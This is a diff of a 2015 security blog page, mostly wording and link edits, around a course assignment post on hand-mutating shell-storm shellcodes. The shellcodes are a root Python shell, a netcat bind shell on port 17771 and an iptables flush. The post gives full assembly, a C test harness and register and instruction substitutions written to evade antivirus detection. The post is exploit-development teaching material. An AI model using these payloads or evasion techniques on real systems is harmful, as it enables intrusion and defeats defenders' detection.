@@ -10,8 +10,7 @@
 </title>
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <link rel="stylesheet" href="http://www.wryway.com/theme/css/cid.css">
-        <link href="http://www.wryway.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Oleg's Web Log Atom Feed" />
+        <link rel="stylesheet" href="/theme/css/cid.css">
         
  
         <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-touch-icon-57x57.png">
@@ -43,12 +42,12 @@
             <div class="container">
 
 <header class="blog-header">
-    <h1><a href="http://www.wryway.com/blog/">Oleg's Web Log</a></h1>
+    <h1><a href="/blog/">Oleg's Web Log</a></h1>
     <p> Stochastic records on Information Security </p>
     <nav>
-        <a href="http://www.wryway.com/blog/categories/">CATEGORIES</a>
-        <a href="http://www.wryway.com/blog/tags/">TAGS</a>
-        <a href="http://www.wryway.com/blog/archives/">ARCHIVES</a>
+        <a href="/blog/categories/">CATEGORIES</a>
+        <a href="/blog/tags/">TAGS</a>
+        <a href="/blog/archives/">ARCHIVES</a>
     </nav>
 </header>
 
@@ -57,7 +56,7 @@
         <header>
             <h1>Mutating existing shellcodes (SLAE, Assignment #6)</h1>
             <p class="category">
-                Category: <a class="category" href="http://www.wryway.com/blog/category/exploit-development/"><b>Exploit development</b></a>
+                Category: <a class="category" href="/blog/category/exploit-development/"><b>Exploit development</b></a>
             </p>
             <p class="date">
                 Written on <time datetime="2015-10-08T20:00:00-04:00">Oct 08, 2015</time>
@@ -66,7 +65,7 @@
 
         <article>
             <p>This post is about modifying shellcode by replacing instructions it uses without changing the overall logic of the given shellcode. This is most often done to evade antivirus and intrusion detection systems.</p>
-<p>There are actually polymorphic engines exist that can take a program and transform it such that the modified version consists of different code yet operates with the same functionality. But in this post we will be doing everything manually.</p>
+<p>There are actually polymorphic engines in existence that can take a program and transform it so that the modified version consists of different code yet operates with the same functionality, but in this post we will be doing everything manually.</p>
 <h1>Sample #1: setreuid() + exec /usr/bin/python - 54 bytes by Ali Razmjoo</h1>
 <p>The first sample from the shell-storm.org I will use here is the <a href="http://shell-storm.org/shellcode/files/shellcode-886.php">shellcode that starts the Python interpreter as root</a>. On the referenced page the shellcode is presented using AT&amp;T syntax. Here is the version translated to the Intel syntax with my comments (I renamed the <em>first</em> and <em>last</em> labels so that their purpose is more obvious):</p>
 <div class="highlight"><pre><span class="k">section</span> <span class="nv">.text</span>
@@ -98,7 +97,7 @@
 </pre></div>
 
 
-<p>Note that the above Assembly program compiles, but does not work by itself because of the self-modifying part. Remember that modifying the executable <em>.text</em> section at runtime is a no-no and leads to a segmentation fault. To test the shellcode we have to employ a framing C program. And the shellcode itself can be copied from the referenced above web page or regenerated using the <a href="https://github.com/reider-roque/reed/tree/master/tools">scdump</a> tool after building an executable from the above source code.</p>
+<p>Note that the above Assembly program compiles, but does not work by itself because of the self-modifying part. Remember that modifying the executable <em>.text</em> section at runtime is a no-no and leads to a segmentation fault. To test the shellcode we have to employ a framing C program. The shellcode itself can be copied from the referenced above web page or regenerated using the <a href="https://github.com/reider-roque/reed/tree/master/tools">scdump</a> tool after building an executable from the above source code.</p>
 <div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
 <span class="cp">#include &lt;string.h&gt;</span>
 
@@ -116,9 +115,9 @@
 </pre></div>
 
 
-<p><img alt="Testing the shellcode" src="http://www.wryway.com/blog/mutating-existing-shellcodes/testing-the-shellcode.png" title="Testing the shellcode" />
+<p><img alt="Testing the shellcode" src="/blog/mutating-existing-shellcodes/testing-the-shellcode.png" title="Testing the shellcode" />
 <div class="img-caption">Testing the shellcode</div></p>
-<p>At first I wanted to do a step by step modification of every couple instructions preserving the overall functionality, but then after reviewing the given shellcode architecture I realized that it is quite inefficient. So I decided to rewrite most of the code employing a couple of shellcode-shortening techniques I learned while taking the SLAE course. Follows my modified copy of the shellcode with some comments:</p>
+<p>At first, I wanted to do a step by step modification of every couple instructions preserving the overall functionality, but then, after reviewing the given shellcode architecture, I realized that it is quite inefficient. So I decided to rewrite most of the code employing a couple of shellcode-shortening techniques I learned while taking the SLAE course. Follows my modified copy of the shellcode with some comments:</p>
 <div class="highlight"><pre><span class="k">section</span> <span class="nv">.text</span>
     <span class="k">global</span> <span class="nv">_start</span>
 
@@ -143,13 +142,13 @@
 
 
 <p>First off all note that this shellcode is 38 bytes long vs 54 bytes of the original one, which is a 30% (!) reduction. Here is the list of tricks I employed to reduce the shellcode size:</p>
-<p>1) In the beginning the EAX register needs to be set to the 0x46, which is the syscall code of the setreuid. For that the original shellcode uses</p>
+<p>1) In the beginning the EAX register needs to be set to the 0x46, which is the syscall code of the setreuid. For that the original shellcode uses this sequence, which takes 4 bytes:</p>
 <div class="highlight"><pre><span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
 <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x46</span>
 </pre></div>
 
 
-<p>sequence, which takes 4 bytes. To shave off a byte I replaced it with the following equivalent:</p>
+<p>To shave off a byte I replaced it with the following equivalent:</p>
 <div class="highlight"><pre><span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x46</span>
 <span class="nf">pop</span> <span class="nb">eax</span>
 </pre></div>
@@ -169,7 +168,7 @@
 
 
 <p>that stores the quotient into EAX and remainder into EDX. And since the divisor (EBX) was 0, both the quotient and remainder were set to 0.</p>
-<p>To convert the <em>//usr/bin/python</em> string to instructions that are used to push the string onto the stack I used the <a href="https://github.com/reider-roque/reed/tree/master/tools">str4sc</a> tool. I had to add an extra slash to the path so that the string length became a multiple of 4 - a condition necessary for storing null-free strings on the stack.</p>
+<p>To convert the <em>//usr/bin/python</em> string to instructions that are used to push the string onto the stack I used the <a href="https://github.com/reider-roque/reed/tree/master/tools">str4sc</a> tool. I had to add an extra slash to the path so that the string length became a multiple of 4, a condition necessary for storing null-free strings on the stack.</p>
 <h1>Sample #2: /bin/nc -le /bin/sh -vp 17771 - 58 bytes by Oleg Boytsev</h1>
 <p>Here comes our second shell-storm sample - the <a href="http://shell-storm.org/shellcode/files/shellcode-872.php">netcat assisted bind shell</a>:</p>
 <div class="highlight"><pre><span class="nf">global</span> <span class="no">_start</span>
@@ -203,7 +202,7 @@
 </pre></div>
 
 
-<p>There is nothing complicated about this shellcode. All it does is just starts the Netcat listening on port 17771 and serving shell to anyone connecting to that port. From the get-go I found only way to reduce the overall size by 1 byte: replacing all</p>
+<p>There is nothing complicated about this shellcode. All it does is just start the Netcat listening on port 17771 and serving shell to anyone connecting to that port. From the get-go I found only one way to reduce the overall size by 1 byte: replacing all</p>
 <div class="highlight"><pre><span class="nf">push</span> <span class="nb">eax</span>
 </pre></div>
 
@@ -258,7 +257,7 @@
 </pre></div>
 
 
-<p>Next I will continue mutate the shellcode, trying to not increase the overall size. One thing we can begin with is playing around the strings we have at our disposal. We can modify them in such a way that overall functionality stays the same. Remember that length for each string must stay a multiple of 4. Here how I modified the strings:</p>
+<p>Next, I will continue to mutate the shellcode, trying not to increase the overall size. One thing we can begin with is playing around the strings we have at our disposal. We can modify them in such a way that overall functionality stays the same. Remember that length for each string must stay a multiple of 4. Here is how I modified the strings:</p>
 <div class="highlight"><pre>-vp17771        -&gt;    -lp17771
 -le//bin//sh    -&gt;    -ve/bin///sh
 /bin//nc        -&gt;    //bin/nc
@@ -266,7 +265,7 @@
 
 
 <p>In the wild I would also change the port number, but for the sake of keeping functionality 100% unchanged I do not do it here.</p>
-<p>And the last change that will complicate AV detection will be replacing one register with another whenever possible throughout the code. This will work because every instruction translates to a different sequence of bytes and that is exactly what we need. Follows the map of replacements I made in the original shellcode and then the whole body of the modified shellcode:</p>
+<p>And the last change that will complicate AV detection will be replacing one register with another whenever possible throughout the code. This will work because every instruction translates to a different sequence of bytes, and that is exactly what we need. Follows the map of replacements I made in the original shellcode and then the whole body of the modified shellcode:</p>
 <div class="highlight"><pre>mov esi, esp -&gt; mov eax, esp
 mov edi, esp -&gt; mov esi, esp
 push esi     -&gt; push eax
@@ -329,16 +328,16 @@ push edi     -&gt; push esi
     mov edx, eax
     mov al, 0xb
     int 80h</p>
-<p>All the shellcode does is calls the /sbin/iptables with -F flag.</p>
-<p>A couple notes before I begin mutating the code. In this case I will not try to keep the shellcode from growing. Quite opposite, I will expand a line of code into two or more lines. The only limit that I am going to stick to is that the resulted shellcode mutant must not exceed 150% of the original shellcode size.</p>
-<p>Despite of what I've just said I couldn't stop myself from decreasing the shellcode size by 1 byte first =). All in all this change helps us to achieve the end goal of changing the shellcode structure. To shave the byte off I replaced EAX with EDX in the following two instructions:</p>
+<p>All the shellcode does is call the /sbin/iptables with -F flag.</p>
+<p>A couple notes before I begin mutating the code. In this case I will not try to keep the shellcode from growing. Quite the opposite, I will expand a line of code into two or more lines. The only limit that I am going to stick to is that the resulted shellcode mutant must not exceed 150% of the original shellcode size.</p>
+<p>Despite of what I've just said, I couldn't stop myself from decreasing the shellcode size by 1 byte first =). All in all this change helps us to achieve the end goal of changing the shellcode structure. To shave the byte off I replaced EAX with EDX in the following two instructions:</p>
 <div class="highlight"><pre><span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
 
 <span class="nf">push</span> <span class="nb">eax</span>
 </pre></div>
 
 
-<p>And to make the shellcode working again I removed</p>
+<p>And to make the shellcode work again, I removed</p>
 <div class="highlight"><pre><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>
 </pre></div>
 
@@ -354,7 +353,7 @@ push edi     -&gt; push esi
 </pre></div>
 
 
-<p>The line I removed zeroed out EDX, which was unneeded after previous modification, EDX is all 0s already at that step. And the replacement was just an equivalent of loading 0xb (execve syscall #) into EAX that doesn't depend on EAX being zeroed first.</p>
+<p>The line I removed zeroed out EDX, which was unneeded after previous modification. EDX is all 0s already at that point. And the replacement was just an equivalent of loading 0xb (execve syscall #) into EAX that doesn't depend on EAX being zeroed first.</p>
 <p>Here is the intermediate result incorporating the above changes:</p>
 <div class="highlight"><pre><span class="k">section</span> <span class="nv">.text</span>
     <span class="k">global</span> <span class="nv">_start</span>
@@ -380,7 +379,7 @@ push edi     -&gt; push esi
 </pre></div>
 
 
-<p>Now let me show how with a little imagination you can expand any instruction thus modifying the underlying opcodes (but be careful to not add null or other bad chars relevant to your case):</p>
+<p>Now, let me show how with a little imagination you can expand any instruction, thus modifying the underlying opcodes (but be careful to not add null or other bad chars relevant to your case):</p>
 <p>1) The third line pushes the <em>-F</em> string onto the stack. We can expand it in some fancy way:</p>
 <div class="highlight"><pre><span class="nf">mov</span> <span class="nb">bx</span><span class="p">,</span> <span class="mh">0x2316</span>
 <span class="nf">add</span> <span class="nb">bx</span><span class="p">,</span> <span class="mh">0x2317</span>
@@ -445,7 +444,7 @@ push edi     -&gt; push esi
 </pre></div>
 
 
-<p>And to make sure it is still working you can build it and assuming that your iptables do not contain any rules (as, by default, is the case on Kali Linux) using the following commands:</p>
+<p>And to make sure it is still working you can build it, assuming that your iptables do not contain any rules (as, by default, is the case on Kali Linux) using the following commands:</p>
 <div class="highlight"><pre>nasm -f elf ipt2.asm <span class="o">&amp;&amp;</span> ld -o ipt2 ipt2.o
 iptables -A INPUT -p tcp --dport <span class="m">22</span> -j ACCEPT <span class="o">&amp;&amp;</span> iptables -L -vn
 ./ipt2 <span class="o">&amp;&amp;</span> iptables -L -vn
@@ -476,19 +475,6 @@ This blog post was created to fulfill the requirements of the <a href="http://se
             </p>
         </footer>
 
-<div class="comments">
-    <div id="disqus_thread"></div>
-    <script type="text/javascript">
-        var disqus_shortname = 'wryway';
-        (function() {
-            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-        })();
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</div>
 
     </div>
 
@@ -508,16 +494,10 @@ This blog post was created to fulfill the requirements of the <a href="http://se
     </ul>
 
     <p class="disclaimer">
-    Oleg Mitrofanov &copy; 2015.
+    Oleg Mitrofanov &copy; 2015-2016.
     Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/hdra/Pelican-Cid">Cid</a> theme.
     </p>
 </footer>
             </div>
-<script>
-    var _gaq=[['_setAccount','UA-68669065-1'],['_trackPageview']];
-    (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
-    g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
-    s.parentNode.insertBefore(g,s)}(document,'script'));
-</script>
     </body>
 </html>
